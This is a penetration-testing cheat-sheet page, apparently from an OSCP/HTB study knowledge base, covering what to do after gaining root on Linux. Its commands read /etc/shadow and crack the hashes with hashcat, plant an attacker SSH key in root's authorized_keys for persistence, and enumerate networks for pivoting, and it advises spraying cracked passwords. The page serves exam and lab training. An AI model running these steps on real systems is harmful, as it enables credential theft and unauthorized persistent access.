---
id: root-linux
title: Root Flag / Proof (Linux)
stage: objective
tags: [linux]
summary: You have root — grab the proof file, dump /etc/shadow for password reuse, plant SSH key persistence, and check for additional network segments to pivot into.
leads_to:
  - pivot
  - linux-cred-hunting
---

## Prerequisites

A root shell (any method). The proof file location depends on the exam (`/root/root.txt` for HTB, `/root/proof.txt` for OSCP). Always run `id && hostname` before the cat command so both appear in the same screenshot.

Root access on Linux ends the local privilege escalation phase but doesn't mean the engagement is over. Immediately dump `/etc/shadow` for password reuse across other hosts, check network interfaces and routes for additional segments, and plant SSH persistence so you don't lose access if your shell drops.

## Quick Win

> id, hostname, and the proof file — in one command for a clean screenshot.

```bash
id && hostname && cat /root/root.txt
id && hostname && cat /root/proof.txt
```

## Grab Proof

> OSCP format requires both id and hostname visible with the proof content.

```bash
id && hostname && cat /root/root.txt
id && hostname && cat /root/proof.txt
```

## Dump Shadow (Password Reuse)

> Root hashes often reused as system passwords or SSH credentials on other machines.

```bash
cat /etc/shadow
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt   # sha512crypt ($6$)
hashcat -m 500  shadow.txt /usr/share/wordlists/rockyou.txt   # md5crypt ($1$)
```

## SSH Key Persistence

> Plant authorized_keys so the shell survives your nc session dropping.

```bash
mkdir -p /root/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
ssh -i attacker_key root@$TARGET
```

## Check for Additional Networks

> Every root box should be checked for additional segments — the next target may be reachable only from here.

```bash
ip a
ip route
arp -a
cat /etc/hosts
ss -anp   # internal listeners
```

## Leads To

Additional NIC or route found → pivot to new network segment using Chisel or Ligolo-ng. SSH keys found in `/root/.ssh/` → try them against other hosts. Cracked shadow passwords → spray across all known services (SSH, FTP, WinRM, RDP). Internal services on `ss -anp` → port-forward them to your attacker box for further enumeration.
